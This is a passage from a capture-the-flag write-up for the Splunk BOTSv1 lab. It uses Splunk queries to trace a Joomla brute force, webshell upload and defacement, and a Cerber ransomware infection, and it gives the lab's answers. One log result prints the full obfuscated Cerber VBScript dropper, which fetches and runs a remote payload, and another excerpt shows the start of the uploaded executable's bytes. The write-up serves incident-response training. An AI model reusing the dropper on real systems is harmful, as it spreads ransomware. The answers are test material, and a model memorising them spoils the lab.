+<span class="c">#9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| <span class="nb">eval </span><span class="nv">pl</span><span class="o">=</span>len<span class="o">(</span>p<span class="o">)</span>
+| stats avg<span class="o">(</span>pl<span class="o">)</span> as av
+| <span class="nb">eval </span><span class="nv">avg_count</span><span class="o">=</span>round<span class="o">(</span>av,0<span class="o">)</span>
+| table avg_count
+
+Answer: 6
+
+
+
+<span class="c">#10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?</span>
+<span class="c"># 1 of the passwords (batman) was used 2 times.</span>
+<span class="c"># extract the timestamps for the occurences of this password.</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span> | rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| search <span class="nv">p</span><span class="o">=</span><span class="s2">"batman"</span>
+| table _time, p, src_ip
+| <span class="nb">sort </span>by _time
+<span class="c"># _time	p	src_ip</span>
+<span class="c"># 2016-08-10 21:46:33.689	batman	23.22.63.114</span>
+<span class="c"># 2016-08-10 21:48:05.858	batman	40.80.148.42</span>
+
+<span class="c"># Now use transaction to compute the delay between these timestamps.</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span> | rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| search <span class="nv">p</span><span class="o">=</span><span class="s2">"batman"</span>
+| transaction p
+| <span class="nb">eval </span><span class="nv">dur</span><span class="o">=</span>round<span class="o">(</span>duration,2<span class="o">)</span>
+| table dur
+Answer: 92.17
+
+
+
+<span class="c">#11 How many unique passwords were attempted in the brute force attempt?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 imreallynotbatman.com <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">http_method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">form_data</span><span class="o">=</span><span class="k">*</span>username<span class="k">*</span>passwd<span class="k">*</span>
+| rex <span class="nv">field</span><span class="o">=</span>form_data <span class="s2">"passwd=(?&lt;p&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| dedup p
+| stats count
+Answer: 412
+
+
+
+
+<span class="c">#12 What is the name of the executable uploaded by P01s0n1vy?</span>
+<span class="c"># An upload form is usually structured as follows:</span>
+&lt;form <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"_URL_"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span><span class="o">&gt;</span>
+<span class="c"># search for multipart/form-data:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">dest</span><span class="o">=</span><span class="s2">"192.168.250.70"</span> <span class="s2">"multipart/form-data"</span>
+| <span class="nb">head </span>1
+<span class="c"># Result:</span>
+<span class="c"># {"endtime":"2016-08-10T21:52:47.035555Z","timestamp":"2016-08-10T21:52:45.437445Z","accept":"text/html, application/xhtml+xml, */*","accept_language":"en-US","ack_packets_in":1,"ack_packets_out":55,"bytes":77896,"bytes_in":77648,"bytes_out":248,"c_ip":"40.80.148.42","cached":0,"capture_hostname":"demo-01","client_rtt":0,"client_rtt_packets":0,"client_rtt_sum":0,"connection_type":"Keep-Alive","content_disposition":["form-data; name=\"userfile[0]\";</span>
+<span class="c"># filename=\"3791.exe\"","form-data; name=\"userfile[1]\";</span>
+<span class="c"># filename=\"agent.php\"","form-data; name=\"userfile[2]\";</span>
+<span class="c"># filename=\"\"","form-data; name=\"userfile[3]\"; filename=\"\"","form-data; name=\"userfile[4]\"; filename=\"\"","form-data; name=\"userfile[5]\"; filename=\"\"","form-data; name=\"userfile[6]\"; filename=\"\"","form-data; name=\"overwrite_files\"","form-data; name=\"option\"","form-data; name=\"action\"","form-data; name=\"dir\"","form-data; name=\"requestType\"","form-data; name=\"confirm\""],"cookie":"7598a3465c906161e060ac551a9e0276=9qfk2654t4rmhltilkfhe7ua23","cs_cache_control":"no-cache","cs_content_length":77045,"cs_content_type":"multipart/form-data; boundary=---------------------------7e0e42c20990","cs_version":["1.1","1.1"],"data_center_time":1049868,"data_packets_in":55,"data_packets_out":1,"dest_content":"{'action':'upload','message':'Upload successful!','error':'Upload successful!','success':true}","dest_headers":"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: Microsoft-IIS/8.5\r\nX-Powered-By: PHP/5.5.38\r\nDate: Wed, 10 Aug 2016 21:52:47 GMT\r\nContent-Length: 94\r\n\r\n","dest_ip":"192.168.250.70","dest_mac":"00:0C:29:C4:02:7E","dest_port":80,"duplicate_packets_in":52,"duplicate_packets_out":1,"http_comment":"HTTP/1.1 200 OK","http_content_length":94,"http_content_type":"text/html","http_method":"POST","http_referrer":"http://imreallynotbatman.com/joomla/administrator/index.php?option=com_extplorer&amp;tmpl=component","http_user_agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","missing_packets_in":0,"missing_packets_out":0,"network_interface":"eth1","packets_in":56,"packets_out":56,"part_filename":["3791.exe","agent.php"],"reply_time":1049868,"request":"POST /joomla/administrator/index.php HTTP/1.1","request_ack_time":10,"request_time":548242,"response_ack_time":81928,"response_time":0,"sc_date":"Wed, 10 Aug 2016 21:52:47 GMT","server":"Microsoft-IIS/8.5","server_rtt":5934,"server_rtt_packets":26,"server_rtt_sum":154301,"site":"imreallynotbatman.com","src_content":"-----------------------------7e0e42c20990\r\nContent-Disposition: form-data; name=\"userfile[0]\"; filename=\"3791.exe\"\r\nContent-Type: application/octet-stream\r\n\r\nMZ�\u0000\u0003\u0000\u0000\u0000\u0004\u0000\u0000\u0000��\u0000\u0000�\u0000\u0000\u0000\u0000\u0000\u0000\u0000@\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000�\u0000\u0000\u0000\u000E\u001F�\u000E\u0000�\t�!�\u0001L�!This program cannot be run in DOS mode.\r\r\n$\u0000\u0000\u0000\u0000\u0000\u0000\u0000�8���Y���Y���Y���E���Y��TE���Y���F���Y���F���Y���Y��\u001EY��TQÅ�Y���z���Y��\u0010_���Y��Rich�Y��\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000PE</span>
+<span class="c"># [REDACTED]</span>
+
+
+<span class="c"># The interesting piece is part_filename":["3791.exe","agent.php"].</span>
+<span class="c"># We’ll use this to run another search and extract the names of files that have been uploaded:</span>
+
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>stream:http <span class="nv">dest</span><span class="o">=</span><span class="s2">"192.168.250.70"</span> <span class="s2">"multipart/form-data"</span>
+|  stats count by part_filename<span class="o">{}</span>
+It results <span class="k">in </span>2 files:
+<span class="c"># part_filename{}	count</span>
+<span class="c"># 3791.exe	1</span>
+<span class="c"># agent.php	1</span>
+Answer: 3791.exe
+
+
+
+
+
+<span class="c">#13 What is the MD5 hash of the executable uploaded?</span>
+<span class="c"># The MD5 hash seems to be available from 1 sourcetype:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 3791.exe md5
+| stats count by sourcetype
+<span class="c"># sourcetype	count</span>
+<span class="c"># XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	67</span>
+
+<span class="c"># Here is the request to extract the MD5:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 3791.exe <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="s2">"3791.exe"</span>
+| rex <span class="nv">field</span><span class="o">=</span>_raw <span class="nv">MD5</span><span class="o">=</span><span class="s2">"(?&lt;md5sum&gt;</span><span class="se">\w</span><span class="s2">+)"</span>
+| table <span class="nb">md5sum
+
+</span>Answer: AAE3F5A29935E6ABCC2C2754D12A9AF0
+
+
+
+<span class="c">#14 What is the name of the file that defaced the imreallynotbatman.com website?</span>
+<span class="c"># In the attack phases, the attacker is likely to have found a vulnerability, and exploited it to download files from the server, to an external server.</span>
+<span class="c"># As we have already identified 2 IP addresses involved in the attack, let’s use them as destinations.</span>
+<span class="c"># Let’s search for requests originating from the server, with suricata logs to 23.22.63.114:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"suricata"</span> <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"192.168.250.70"</span> <span class="nv">dest_ip</span><span class="o">=</span><span class="s2">"23.22.63.114"</span>
+|  stats count by http.http_method, http.hostname, http.url
+|  <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># Results:</span>
+<span class="c"># http.http_method	http.hostname	                        http.url	                                count</span>
+<span class="c"># GET	            imreallynotbatman.com	                /joomla/administrator/index.php	            824</span>
+<span class="c"># POST	            imreallynotbatman.com	                /joomla/administrator/index.php	            411</span>
+<span class="c"># GET	            71.39.18.126	                        /joomla/agent.php	                        52</span>
+<span class="c"># GET	            prankglassinebracket.jumpingcrab.com	/poisonivy-is-coming-for-you-batman.jpeg	3</span>
+Answer: poisonivy-is-coming-for-you-batman.jpeg
+
+
+
+
+<span class="c">#15 This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?</span>
+<span class="c"># already identified the FQDN in the previous request.</span>
+Answer: prankglassinebracket.jumpingcrab.com
+
+
+
+
+<span class="c">#16 What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?</span>
+Answer: 23.22.63.114
+
+
+
+<span class="c">#17 Based on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with P01s0n1vy APT group?</span>
+<span class="c"># Googling for the IOCs collected so far leads to https://threatcrowd.org/ip.php?ip=23.22.63.114 where we are presented with a relationship diagram involving domains, IPs, emails:</span>
+Answer: lillian.rose@po1s0n1vy.com
+
+
+
+<span class="c">#18 GCPD reported that common TTPs (Tactics, Techniques, Procedures) for the P01s0n1vy APT group if initial compromise fails is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to P01s0n1vy’s initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.</span>
+<span class="c"># Following online searches leads to https://www.threatminer.org/host.php?q=23.22.63.114 where we are provided with file hashes, 1 of which being identified as malicious by many AV solutions:</span>
+aae3f5a29935e6abcc2c2754d12a9af0
+39eecefa9a13293a93bb20036eaf1f5e
+c99131e0169171935c5ac32615ed6261 <span class="o">(</span>malicious<span class="o">)</span>
+<span class="c"># The last hash (https://www.threatminer.org/sample.php?q=c99131e0169171935c5ac32615ed6261) is associated with the following SHA256:</span>
+Answer: 9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8
+
+
+
+
+<span class="c">#19 What special hex code is associated with the customized malware discussed in the previous question?</span>
+<span class="c"># Looking for the hash on Virustotal (https://www.virustotal.com/gui/file/9709473ab351387aab9e816eff3910b9f28a7a70202e250ed46dba8f820f34a8/community) shows an hex string associated to this malware:</span>
+53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21
+
+
+
+<span class="c">#20 What does this hex code decode to?</span>
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"53 74 65 76 65 20 42 72 61 6e 74 27 73 20 42 65 61 72 64 20 69 73 20 61 20 70 6f 77 65 72 66 75 6c 20 74 68 69 6e 67 2e 20 46 69 6e 64 20 74 68 69 73 20 6d 65 73 73 61 67 65 20 61 6e 64 20 61 73 6b 20 68 69 6d 20 74 6f 20 62 75 79 20 79 6f 75 20 61 20 62 65 65 72 21 21 21"</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
+Steve Brants Beard is a powerful thing. Find this message and ask him to buy you a beer!!!
+
+</pre></table></code></div></div><p>Summary</p><ul><li>Scanned for vulnerabilities<li>Found site is running Joomla<li>Performed a brute force password scan, logged into Joomla, installed file upload modules<li>Uploaded webshell<li>Used webshell to upload reverse TCP shell<li>Connected via metasploit<li>Tried to move around but couldn’t get out of locked down Windows 2012R2<li>Defaced website with downloaded defacement image</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/5QPVmqm.png" alt="1000px-Ctf-tryhackme-BP-Splunk-LMKC-final" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/ULgYYZx.png" alt="1000px-Ctf-tryhackme-BP-Splunk-APT-threat-all" /></p><p>Ransomware:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+</pre><td class="rouge-code"><pre><span class="c"># One of your users at Wayne Enterprises has managed to get their machine infected, discover how it happened!</span>
+
+
+<span class="c">#1 What was the most likely IP address of we8105desk on 24AUG2016?</span>
+<span class="c"># Apply a time filter to match the date 08/24/2016 to the below request:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 we8105desk
+| stats count by sourcetype
+| <span class="nb">sort</span> <span class="nt">-count</span>
+<span class="c"># sourcetype	count</span>
+<span class="c"># XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	104360</span>
+<span class="c"># wineventlog	10028</span>
+<span class="c"># stream:smb	1528</span>
+<span class="c"># stream:ldap	48</span>
+<span class="c"># nessus:scan	24</span>
+<span class="c"># WinRegistry	3</span>
+
+<span class="c"># Now, let’s request the IP seen by the first source:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 we8105desk  <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span>
+| stats count by src_ip
+| sort-count
+<span class="c"># src_ip	count</span>
+<span class="c"># 192.168.250.100	52270</span>
+<span class="c"># 192.168.250.255	69</span>
+<span class="c"># 127.0.0.1	66</span>
+<span class="c"># 0.0.0.0	42</span>
+<span class="c"># 224.0.0.252	6</span>
+<span class="c"># 192.168.250.70	1</span>
+Answer: 192.168.250.100
+
+
+
+<span class="c">#2 What is the name of the USB key inserted by Bob Smith?</span>
+<span class="c"># find name usb key registry: https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-device-specific-registry-settings</span>
+<span class="c"># the name of USB key is stored under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB, in a key named FriendlyName.</span>
+<span class="c"># Let’s search for it:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">sourcetype</span><span class="o">=</span>WinRegistry friendlyname
+| stats count by registry_value_data
+Answer: MIRANDA_PRI
+
+
+
+<span class="c">#3 After the USB insertion, a file execution occurs that is the initial Cerber infection. This file execution creates two additional processes. What is the name of the file?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 we8105desk <span class="nv">sourcetype</span><span class="o">=</span>XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+| makemv <span class="nv">delim</span><span class="o">=</span><span class="s2">":"</span> CurrentDirectory
+| <span class="nb">eval </span><span class="nv">drive</span><span class="o">=</span>mvindex<span class="o">(</span>CurrentDirectory,0<span class="o">)</span>
+| stats count by drive
+<span class="c"># drive	count</span>
+<span class="c"># C	298</span>
+<span class="c"># D	7</span>
+<span class="c"># The USB key is with drive D:\.</span>
+
+<span class="c"># Now, let’s search in the sysmon logs for commands mentioning this drive.</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">host</span><span class="o">=</span><span class="s2">"we8105desk"</span> <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="nv">CommandLine</span><span class="o">=</span><span class="s2">"*D:</span><span class="se">\\</span><span class="s2">*"</span>
+| table _time, CommandLine
+| reverse
+<span class="c"># Results:</span>
+<span class="c"># _time	                CommandLine</span>
+<span class="c"># 2016-08-24 16:43:12	“C:Files (x86)Office14.EXE” /n /f "D:_Tate_unveiled.dotm"</span>
+<span class="c"># 2016-08-24 16:56:47	“C:3232.exe” C:3232.dll,OpenAs_RunDLL D:Stuff\013\013366.pdf</span>
+Answer: Miranda_Tate_unveiled.dotm
+
+
+
+<span class="c">#4 During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of this field?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">host</span><span class="o">=</span><span class="s2">"we8105desk"</span> <span class="nv">sourcetype</span><span class="o">=</span><span class="s2">"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</span> <span class="o">(</span><span class="nv">CommandLine</span><span class="o">=</span><span class="s2">"*D:</span><span class="se">\\</span><span class="s2">*"</span> OR <span class="nv">ParentCommandLine</span><span class="o">=</span><span class="s2">"*D:</span><span class="se">\\</span><span class="s2">*"</span><span class="o">)</span>
+| <span class="nb">eval </span><span class="nv">length</span><span class="o">=</span>len<span class="o">(</span>CommandLine<span class="o">)</span>
+| table CommandLine, length
+| <span class="nb">sort </span>by <span class="nt">-length</span>
+| <span class="nb">head </span>1
+<span class="c"># Results:</span>
+<span class="c"># CommandLine	length</span>
+<span class="c"># cmd.exe /V /C set “GSI=%APPDATA%%RANDOM%.vbs” &amp;&amp; (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv&lt;&gt;3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr&lt;Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(”3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D“,”Yo“))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(”0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826“,”QcOi4XA“))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW"" “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(”332A7B05156A211A46243629“,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk"" “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(”3C07082602241F7A383C0E3807“,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(”013B183400023A“,”EQiWw“))” “D9S=38” “RWRL=Dzc0(A9y(”14630811720C14“,”XU3“))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ"" “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(”2E38122329103E1725683B1C3D19123701“,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(”0D0E1E“,”KJ“),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(”1F59242828“,”OM8J“),A9y(”0D354C3D356B567A0F6B6B“,”VoL8XF“)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(”652840353A542512023C5B3D572F27“,”S5I2A“) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0"" “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(”033125365F3D213E326A68030210121060“,IK))” “QJ=35” “BAU7Cz.oPeN A9y(”2A2F0E“,”TmjZ8d“),A9y(”07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26“,”Ao" ),5022-5022" “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(”1439190A24“,”AFXwm“),A9y(”371038301A716C5F7B6644“,”LUi“)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(”03510A3B3A51146F105F163B365E0C“,”OS0x“) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=”"""" “SX6=93” “WIbud=RWRL &amp; Ql9zEF &amp; A9y(”4A330F3F“,”WdGbOGp“)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”" tHen MA(4)" “CHaK=38” “EuM=”Iqxkf"" “U56m=67” “SEt VP=creATeoBJEcT(A9y(”262B081420010C453521141407“,EuM))” “U5Quw=85” “VP.Run A9y(”1023287B163629755C0D6C06270F1E01536C6E7551“,”UsNL“) &amp; WIbud &amp; NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” “Next” “KK0H=46” “enD sUb”) do @echo %~i)&gt;“!GSI!” &amp;&amp; start "" “!GSI!”	4490</span>
+Answer: 4490
+
+
+
+
+<span class="c">#5 Bob Smith's workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">host</span><span class="o">=</span><span class="s2">"we8105desk"</span> <span class="nv">sourcetype</span><span class="o">=</span>WinRegistry fileshare
+| <span class="nb">head </span>1
+<span class="c"># Time	Event</span>
+<span class="c"># 8/24/16 5:15:18.000 PM</span>
+<span class="c"># 08/24/2016 11:15:18.043</span>
+<span class="c"># … 2 lines omitted …</span>
+<span class="c"># process_image=“c:.exe”</span>
+<span class="c"># registry_type=“CreateKey”</span>
+<span class="c"># key_path=“HKU-1-5-21-67332772-3493699611-3403467266-11092#</span>
+<span class="c"># #192.168.250.20#fileshare”</span>
+<span class="c"># data_type=“REG_NONE”</span>
+Answer: 192.168.250.20
+
+
+
+<span class="c">#6 What was the first suspicious domain visited by we8105desk on 24AUG2016?</span>
+<span class="c"># After removing all legitimate domains:</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"192.168.250.100"</span> <span class="nv">sourcetype</span><span class="o">=</span>stream:dns <span class="nv">record_type</span><span class="o">=</span>A NOT <span class="o">(</span>query<span class="o">{}=</span><span class="s2">"*microsoft.com"</span> OR query<span class="o">{}=</span><span class="s2">"wpad"</span> OR query<span class="o">{}=</span><span class="s2">"*.waynecorpinc.local"</span> OR query<span class="o">{}=</span><span class="s2">"isatap"</span> OR query<span class="o">{}=</span><span class="s2">"*bing.com"</span> OR query<span class="o">{}=</span><span class="s2">"*windows.com"</span> OR query<span class="o">{}=</span><span class="s2">"*msftncsi.com"</span><span class="o">)</span>
+| table _time, query<span class="o">{}</span>
+| <span class="nb">sort </span>by _time
+<span class="c"># Results:</span>
+<span class="c"># _time	query{}</span>
+<span class="c"># 2016-08-24 16:48:12.267	solidaritedeproximite.org</span>
+<span class="c">#                           solidaritedeproximite.org</span>
+<span class="c"># 2016-08-24 16:49:24.308	ipinfo.io</span>
+<span class="c">#                           ipinfo.io</span>
+<span class="c"># 2016-08-24 17:15:12.668	cerberhhyed5frqa.xmfir0.win</span>
+<span class="c">#                           cerberhhyed5frqa.xmfir0.win</span>
+Answer: solidaritedeproximite.org
+
+
+
+
+<span class="c">#7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?</span>
+<span class="nv">index</span><span class="o">=</span>botsv1 <span class="nv">src_ip</span><span class="o">=</span><span class="s2">"192.168.250.100"</span> <span class="nv">sourcetype</span><span class="o">=</span>suricata http.hostname<span class="o">=</span>solidaritedeproximite.org
+|  table _time, http.http_method, http.hostname, http.url
